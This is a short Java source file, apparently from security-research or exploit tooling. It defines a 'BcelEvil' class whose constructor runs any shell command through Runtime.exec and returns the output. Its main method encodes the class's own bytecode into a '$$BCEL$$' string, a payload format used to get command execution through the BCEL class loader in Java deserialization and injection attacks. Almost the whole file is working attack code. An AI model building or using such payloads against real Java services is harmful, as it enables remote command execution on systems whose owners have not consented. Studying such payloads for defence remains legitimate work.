import com.sun.org.apache.bcel.internal.classfile.Utility;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

public class BcelEvil {

    String res;

    public BcelEvil(String cmd) throws IOException {
        StringBuilder stringBuilder = new StringBuilder();
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
        String line;
        while((line = bufferedReader.readLine()) != null) {
            stringBuilder.append(line).append("\n");
        }
        res = stringBuilder.toString();
    }

    @Override
    public String toString() {
        return res;
    }

    public static void main(String[] args) throws IOException {
        InputStream inputStream = BcelEvil.class.getClassLoader().getResourceAsStream("BcelEvil.class");
        byte[] bytes = new byte[inputStream.available()];
        inputStream.read(bytes);
        String code = Utility.encode(bytes, true);
        System.out.println("$$BCEL$$" + code);
    }
}